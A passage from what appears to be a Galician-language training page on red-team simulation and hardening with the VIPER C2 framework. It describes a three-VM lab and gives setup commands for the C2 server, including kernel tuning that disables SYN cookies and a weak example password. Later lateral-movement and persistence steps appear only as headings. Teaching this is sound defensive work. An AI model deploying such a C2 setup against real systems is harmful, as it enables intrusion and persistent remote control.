      Obxectivo: Movemento lateral dende VM-2 cara VM-3.
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-1-acceso-a-vm-2-payload-activo" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 1: Acceso á VM-2 (Payload activo)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Paso 1: Acceso á VM-2 (Payload activo)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#execucion-dende-vm-1-msfconsole-viper" class="md-nav__link">
    <span class="md-ellipsis">
      Execución dende VM-1 (msfconsole - VIPER)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#execucion-dende-vm-2-bash-linux" class="md-nav__link">
    <span class="md-ellipsis">
      Execución dende VM-2 (Bash - Linux)
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-2-movemento-lateral-cara-vm-3" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 2: Movemento lateral cara VM-3
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Paso 2: Movemento lateral cara VM-3">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#escaneo-de-vm-3-dende-vm-2" class="md-nav__link">
    <span class="md-ellipsis">
      Escaneo de VM-3 dende VM-2
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-3-movemento-lateral-con-psexec-smb" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 3: Movemento Lateral con Psexec (SMB)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Paso 3: Movemento Lateral con Psexec (SMB)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#execucion-dende-vm-1-msfconsole-viper_1" class="md-nav__link">
    <span class="md-ellipsis">
      Execución dende VM-1 (msfconsole - VIPER)
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-4-verificar-acceso-a-vm-3" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 4: Verificar Acceso á VM-3
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Paso 4: Verificar Acceso á VM-3">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#execucion-dende-vm-1-msfconsole-viper_2" class="md-nav__link">
    <span class="md-ellipsis">
      Execución dende VM-1 (msfconsole - VIPER)
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exemplo-3-persistencia" class="md-nav__link">
    <span class="md-ellipsis">
      Exemplo 3: Persistencia
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exemplo 3: Persistencia">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#persistencia-en-windows-con-metasploit-tras-acceso-con-psexec" class="md-nav__link">
    <span class="md-ellipsis">
      Persistencia en Windows con Metasploit tras acceso con psexec
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Persistencia en Windows con Metasploit tras acceso con psexec">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#paso-1-acceder-a-maquina-vitima-con-psexec" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 1: Acceder á máquina vítima con psexec
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-2-poner-a-sesion-meterpreter-en-background" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 2: Poñer a sesión meterpreter en background
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-3-iniciar-un-multihandler-para-recibir-a-persistencia" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 3: Iniciar un multi/handler para recibir a persistencia
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-4-xerar-o-payload-para-persistencia" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 4: Xerar o payload para persistencia
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-5-subir-o-payload-a-vm-3-e-crear-unha-tarefa-programada-na-vitimavm-3" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 5: Subir o payload a VM-3 e crear unha tarefa programada na vítima(VM-3)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-6-probar-ou-agardar-reconexion" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 6: Probar ou agardar reconexión
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#resumo" class="md-nav__link">
    <span class="md-ellipsis">
      Resumo
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#monitorizacion-do-movemento-lateral-desde-vm-2-a-vm-3" class="md-nav__link">
    <span class="md-ellipsis">
      Monitorización do Movemento Lateral desde VM-2 a VM-3
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bastionado-e-mitigacion-da-vm-3-windows-10" class="md-nav__link">
    <span class="md-ellipsis">
      Bastionado e mitigación da VM-3 (Windows 10)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Bastionado e mitigación da VM-3 (Windows 10)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#configuracion-de-firewall-para-bloquear-movemento-lateral" class="md-nav__link">
    <span class="md-ellipsis">
      Configuración de Firewall para bloquear movemento lateral
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hardenizacion-de-servizos-windows" class="md-nav__link">
    <span class="md-ellipsis">
      Hardenización de Servizos Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#aplicar-politicas-de-seguridade-mediante-gpeditmsc" class="md-nav__link">
    <span class="md-ellipsis">
      Aplicar Políticas de Seguridade mediante gpedit.msc
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#monitoreo-continuo-con-auditpol" class="md-nav__link">
    <span class="md-ellipsis">
      Monitoreo Continuo con Auditpol
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#conclusion" class="md-nav__link">
    <span class="md-ellipsis">
      Conclusión
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="bastionado-e-simulacion-de-ataques-con-viper">Bastionado e Simulación de Ataques con VIPER</h1>
<h2 id="escenario">Escenario</h2>
<p><strong>Contorna: 3 máquinas virtuais (VMs) Oracle VirtualBox<br>
            → 2 máquinas virtuais executando Debian 12: VM-1 e VM-2<br>
            → 1 máquina virtual executando Microsoft Windows 10: VM-3</strong></p>
<div style="background-color:yellow;padding:2px;border-radius:15px;margin-bottom:4px;">
<ul>
<li><strong>VM-1 (Atacante):</strong><ul>
<li><strong>Rol:</strong> Servidor de Comando e Control (C2).</li>
<li><strong>Software Principal:</strong> Instalación base estándar de Debian 12 e <a href="https://viperrtp.com">VIPER</a></li>
<li><strong>Propósito:</strong> Administrar os payloads/axentes, enviar tarefas e recoller información<br>das máquinas vítimas.</li>
<li><strong>Rede:</strong>  <ul>
<li>NIC1: NAT</li>
<li>NIC2: Rede Interna → 192.168.120.100/24  </li>
</ul>
</li>
<li><strong>CPU:</strong> 2</li>
<li><strong>RAM:</strong> 4GB</li>
<li><strong>Disco duro:</strong> 20GB dinámico</li>
</ul>
</li>
</ul>
</div>
<div style="background:red;padding:2px;border-radius:15px;margin-bottom:4px;">
<ul>
<li><strong>VM-2 (Vítima a través de payload):</strong><ul>
<li><strong>Rol:</strong> Sistema obxectivo simulado.</li>
<li><strong>Software Inicial:</strong> Instalación base estándar de Debian 12.</li>
<li><strong>Propósito:</strong> Executar payload xerado por Viper, o cal establecerá unha conexión<br> de volta (callback) cara á VM Atacante (C2).</li>
<li><strong>Rede:</strong>  <ul>
<li>NIC1: NAT</li>
<li>NIC2: Rede Interna → 192.168.120.101/24  </li>
</ul>
</li>
<li><strong>CPU:</strong> 2</li>
<li><strong>RAM:</strong> 4GB</li>
<li><strong>Disco duro:</strong> 20GB dinámico</li>
</ul>
</li>
</ul>
</div>
<div style="background:violet;padding:2px;border-radius:15px;margin-bottom:4px;">
<ul>
<li><strong>VM-3 (Vítima a través de movemento lateral):</strong><ul>
<li><strong>Rol:</strong> Sistema obxectivo simulado.</li>
<li><strong>Software Inicial:</strong> Instalación base estándar de Microsoft Windows 10.</li>
<li><strong>Propósito:</strong> Executar módulo en Viper, o cal establecerá unha conexión<br>dende VM-2 a esta máquina virtual e de volta (callback) cara á VM Atacante (C2).</li>
<li><strong>Rede:</strong>  <ul>
<li>NIC1: NAT</li>
<li>NIC2: Rede Interna → 192.168.120.102/24  </li>
</ul>
</li>
<li><strong>CPU:</strong> 2</li>
<li><strong>RAM:</strong> 4GB</li>
<li><strong>Disco duro:</strong> 20GB dinámico</li>
</ul>
</li>
</ul>
</div>
<div class="admonition warning">
<p class="admonition-title">Tempo execución payload: 30 minutos</p>
<p>Ver <a href="https://www.viperrtp.com/pricing" target="_blank">VIPER Pricing</a><br />
Unha das <strong>limitacións</strong> que posúe a <strong>versión COMMUNITY</strong> que imos empregar é que cada <strong>sesión establecida</strong> coa máquina vítima ten unha <strong>limitación de 30 minutos</strong>.<br />
<strong>Polo tanto isto hai que telo en conta para a realización desta práctica xa que pode ser que a/s conexión/s remate/n e haxa que crear outra/s, cambiando así os PIDs dos procesos executados e os portos da/s conexión/s establecida/s.</strong></p>
</div>
<h2 id="introducion"><strong>Introdución</strong></h2>
<div class="admonition info">
<p class="admonition-title">Importancia de VIPER, Red Team e Blue Team para o Bastionado de Redes e Sistemas</p>
<p>Nos últimos anos, o uso de ferramentas avanzadas de Red Teaming como <strong>VIPER</strong> converteuse nun estándar na industria da ciberseguridade.</p>
<ul>
<li><strong>Red Team:</strong> Son equipos de ciberseguridade ofensiva que teñen como obxectivo identificar vulnerabilidades en infraestruturas, sistemas e aplicacións empregando técnicas similares ás utilizadas por atacantes reais (APT's - Advanced Persistent Threats).</li>
<li><strong>Blue Team:</strong> Son equipos defensivos encargados de protexer, monitorizar e responder a posibles ataques. O seu traballo inclúe mellorar as defensas, aplicar contramedidas e manter a seguridade da infraestrutura.</li>
<li><strong>VIPER:</strong> É unha ferramenta deseñada para simular ataques avanzados de forma flexible e modular. Permite realizar movemento lateral, evasión de deteccións, exfiltración de datos e comunicacións encubertas (C2), o que resulta crucial para comprender como mellorar o bastionado de redes. VIPER pode conectarse con Metasploit Framework, permitindo lanzar explotacións, escalar privilexios e executar cargas útiles(payloads) directamente desde Metasploit, mantendo o control centralizado dentro do panel de VIPER.</li>
<li>
<p><strong>C2 (Command and Control)</strong> é un acrónimo estándar en seguridade informática que significa <strong>Command and Control</strong>. Forma parte da terminoloxía habitual en seguridade ofensiva e defensiva, especialmente en operacións de <strong>Red Teaming</strong> e en ataques reais levados a cabo por actores maliciosos.
  O servidor C2 é un servidor centralizado que os atacantes utilizan para controlar os dispositivos comprometidos. No contexto de <strong>VIPER</strong>, é o elemento que recibe comunicacións dende as máquinas comprometidas, envía comandos e recibe datos extraídos (<strong>exfiltración</strong>).</p>
<p>Permite:<br />
  - <strong>Control remoto dos sistemas comprometidos.</strong><br />
  - <strong>Exfiltración de datos.</strong><br />
  - <strong>Persistencia e mantemento de acceso.</strong><br />
  - <strong>Aplicar técnicas de evasión para evitar deteccións.</strong>  </p>
</li>
</ul>
<p><strong>Por que é importante o bastionado?</strong>
Asegurar os sistemas mediante probas realistas permite que as organizacións comprendan mellor as súas debilidades e implementen contramedidas axeitadas. Isto é esencial para reducir a superficie de ataque e garantir que, mesmo en caso de comprometer un sistema, os danos sexan minimizados.</p>
</div>
<h2 id="alcance-da-proba"><strong>Alcance da Proba</strong></h2>
<ul>
<li>Probas focalizadas en sistemas GNU/Linux e Microsoft Windows dentro dunha rede interna corporativa.</li>
<li>Técnicas utilizadas: <a href="https://www.revshells.com/" target="_blank">Reverse Shell</a>, Movemento Lateral e Persistencia.</li>
<li>Obxectivo principal: Identificar fallas explotables e suxerir mitigacións eficaces.</li>
</ul>
<h2 id="vm-1-atacante-viper"><strong>VM-1 Atacante: VIPER</strong></h2>
<h3 id="1-requisitos-do-sistema"><strong>1. Requisitos do Sistema</strong></h3>
<p>A instalación mínima require:</p>
<ul>
<li><strong>2 núcleos de CPU (2U) e 4 GB de RAM (4G)</strong>.</li>
<li><strong>5GB de espazo en disco</strong></li>
<li>Linux kernel 5.x e superior. Imos empregar <strong>Debian 12</strong></li>
</ul>
<h3 id="2-descarga-e-instalacion-de-viper"><strong>2. Descarga e Instalación de VIPER</strong></h3>
<p>Visita o sitio oficial: <a href="https://www.viperrtp.com/guide/getting_start" target="_blank">viperrtp.com</a> e segue as instrucións proporcionadas para descargar e instalar VIPER.</p>
<p>Basicamente:<br />
1. Cambiar ao usuario <code>root</code>:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>su<span class="w"> </span>-<span class="w"> </span>root
</span></code></pre></div>
2. Optimizar a configuración do sistema operativo
<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.tcp_timestamps<span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="c1"># Desactiva as marcas de tempo TCP (RFC 1323).</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.tcp_tw_reuse<span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="c1"># Permite reutilizar sockets en estado TIME_WAIT para novas conexións saíntes.</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.tcp_tw_recycle<span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="c1"># Habilita a reciclaxe rápida de sockets TIME_WAIT (obsoleto/problemático con NAT, require timestamps).</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.tcp_fin_timeout<span class="o">=</span><span class="m">3</span><span class="w"> </span><span class="c1"># Reduce o tempo (segundos) que un socket permanece no estado FIN_WAIT_2.</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.tcp_keepalive_time<span class="o">=</span><span class="m">1800</span><span class="w"> </span><span class="c1"># Tempo (segundos) de inactividade antes de enviar sondas TCP keepalive (30 min).</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.tcp_rmem<span class="o">=</span><span class="s2">&quot;4096 87380 8388608&quot;</span><span class="w"> </span><span class="c1"># Establece os tamaños mínimo, predeterminado e máximo (bytes) do búfer de recepción TCP.</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.tcp_wmem<span class="o">=</span><span class="s2">&quot;4096 87380 8388608&quot;</span><span class="w"> </span><span class="c1"># Establece os tamaños mínimo, predeterminado e máximo (bytes) do búfer de envío TCP.</span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.tcp_max_syn_backlog<span class="o">=</span><span class="m">262144</span><span class="w"> </span><span class="c1"># Tamaño máximo da cola para conexións TCP entrantes pendentes (SYN_RECV).</span>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.ip_local_port_range<span class="o">=</span><span class="s2">&quot;1024 65535&quot;</span><span class="w"> </span><span class="c1"># Define o rango de portos locais efémeros para conexións saíntes.</span>
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.core.rmem_max<span class="o">=</span><span class="m">16777216</span><span class="w"> </span><span class="c1"># Tamaño máximo absoluto (bytes) do búfer de recepción para todos os sockets.</span>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.core.wmem_max<span class="o">=</span><span class="m">16777216</span><span class="w"> </span><span class="c1"># Tamaño máximo absoluto (bytes) do búfer de envío para todos os sockets.</span>
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.tcp_window_scaling<span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="c1"># Desactiva o escalado da xanela TCP (RFC 1323), pode limitar o rendemento.</span>
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.tcp_sack<span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="c1"># Desactiva o Acuse de Recibo Selectivo (SACK), pode afectar a recuperación de perdas.</span>
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.core.netdev_max_backlog<span class="o">=</span><span class="m">30000</span><span class="w"> </span><span class="c1"># Tamaño máximo da cola de paquetes de entrada por interface de rede antes de procesalos.</span>
</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.tcp_no_metrics_save<span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="c1"># Evita gardar métricas de conexións TCP na caché de rutas ao pechar.</span>
</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.core.somaxconn<span class="o">=</span><span class="m">262144</span><span class="w"> </span><span class="c1"># Tamaño máximo da cola de conexións completadas esperando ser aceptadas (`accept()`).</span>
</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.tcp_syncookies<span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="c1"># Desactiva as SYN cookies (mecanismo de protección contra ataques SYN flood).</span>
</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.tcp_max_orphans<span class="o">=</span><span class="m">262144</span><span class="w"> </span><span class="c1"># Número máximo de sockets TCP &#39;orfos&#39; (sen proceso asociado) no sistema.</span>
</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.tcp_synack_retries<span class="o">=</span><span class="m">2</span><span class="w"> </span><span class="c1"># Número máximo de reintentos para enviar un SYN/ACK en resposta a un SYN.</span>
</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.tcp_syn_retries<span class="o">=</span><span class="m">2</span><span class="w"> </span><span class="c1"># Número máximo de reintentos para enviar un SYN ao iniciar unha conexión.</span>
</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>
</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ulimit -HSn 65535&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/rc.local<span class="w"> </span><span class="c1"># Engade comando a rc.local para aumentar o límite de ficheiros abertos ao arrancar (legacy).</span>
</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ulimit -HSn 65535&quot;</span><span class="w"> </span>&gt;&gt;/root/.bash_profile<span class="w"> </span><span class="c1"># Engade comando ao perfil Bash de root para aumentar o límite de ficheiros abertos nas súas sesións.</span>
</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ulimit -SHn 65535&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/profile<span class="w"> </span><span class="c1"># Engade comando ao perfil global para aumentar o límite de ficheiros abertos para todos os usuarios.</span>
</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a><span class="nb">ulimit</span><span class="w"> </span>-SHn<span class="w"> </span><span class="m">65535</span><span class="w"> </span><span class="c1"># Establece o límite de ficheiros abertos (soft e hard) para a sesión actual da shell.</span>
</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>
</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>sysctl<span class="w"> </span>-w<span class="w"> </span>vm.max_map_count<span class="o">=</span><span class="m">262144</span><span class="w"> </span><span class="c1"># Aumenta o número máximo de rexións de mapeo de memoria (mmap) que pode ter un proceso.</span>
</span></code></pre></div>
3. Instalar <a href="https://github.com/ricardofc/repoEDU-CCbySA/blob/main/SOM/Cheat-Sheet-Docker_A3.pdf" target="_blank">docker</a>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>apt<span class="w"> </span>update<span class="w"> </span><span class="se">\</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="o">&amp;&amp;</span><span class="w"> </span>apt<span class="w"> </span>-y<span class="w"> </span>install<span class="w"> </span>docker.io<span class="w"> </span><span class="se">\</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="o">&amp;&amp;</span><span class="w"> </span>apt<span class="w"> </span>-y<span class="w"> </span>install<span class="w"> </span>docker-compose<span class="w"> </span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>/etc/init.d/docker<span class="w"> </span>status<span class="w"> </span><span class="o">||</span><span class="w"> </span>systemctl<span class="w"> </span>status<span class="w"> </span>docker
</span></code></pre></div>
4. Xerar e acceder ao directorio de instalación:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">VIPER_DIR</span><span class="o">=</span>/root/VIPER
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>mkdir<span class="w"> </span>-p<span class="w"> </span><span class="nv">$VIPER_DIR</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span><span class="nv">$VIPER_DIR</span>
</span></code></pre></div>
5. Xerar docker-compose.yml
<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>tee<span class="w"> </span>docker-compose.yml<span class="w"> </span><span class="s">&lt;&lt;-&#39;EOF&#39;</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="s">services:</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="s">  viper:</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="s">    image: viperplatform/viper:latest</span>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="s">    container_name: viper-c</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="s">    network_mode: &quot;host&quot;</span>
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="s">    restart: always</span>
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="s">    volumes:</span>
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="s">      - ${PWD}/loot:/root/.msf4/loot</span>
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="s">      - ${PWD}/db:/root/viper/Docker/db</span>
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="s">      - ${PWD}/module:/root/viper/Docker/module</span>
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="s">      - ${PWD}/log:/root/viper/Docker/log</span>
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="s">      - ${PWD}/nginxconfig:/root/viper/Docker/nginxconfig</span>
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="s">      - ${PWD}/elasticsearch:/var/lib/elasticsearch</span>
</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="s">    ulimits:</span>
</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="s">      nofile:</span>
</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="s">        soft: 65534</span>
</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="s">        hard: 65534</span>
</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="s">      nproc:</span>
</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a><span class="s">        soft: 65534</span>
</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a><span class="s">        hard: 65534</span>
</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a><span class="s">    command: [&quot;VIPER_PASSWORD&quot;]</span>
</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a><span class="s">EOF</span>
</span></code></pre></div>
6. Configurar o contrasinal <code>abc123.</code> para o login do usuario <code>root</code>:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Usar un contrasinal seguro na práctica. Para o exemplo:</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">VIPER_PASSWORD</span><span class="o">=</span>abc123.
</span></code></pre></div>
7. Escribir o contrasinal no arquivo <code>docker-compose.yml</code>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>sed<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;s/VIPER_PASSWORD/</span><span class="nv">$VIPER_PASSWORD</span><span class="s2">/g&quot;</span><span class="w"> </span>docker-compose.yml
</span></code></pre></div></p>
<hr />
<h3 id="3-configuracion-do-dashboard-en-viper"><strong>3. Configuración do Dashboard en VIPER</strong></h3>
<p>VIPER ofrece un <strong>Dashboard</strong> web para xestionar ataques e monitorizar operacións. Para acceder ao Dashboard:</p>
<ol>
<li>
<p>Inicia o servidor VIPER:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">cd</span><span class="w"> </span><span class="nv">$VIPER_DIR</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="c1"># Nota: Asegúrate que Docker está en execución (systemctl start docker)</span>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>docker-compose<span class="w"> </span>up<span class="w"> </span><span class="o">||</span><span class="w"> </span>docker-compose<span class="w"> </span>up<span class="w"> </span>-d<span class="w"> </span><span class="c1"># -d → Executar en segundo plano</span>
</span></code></pre></div>
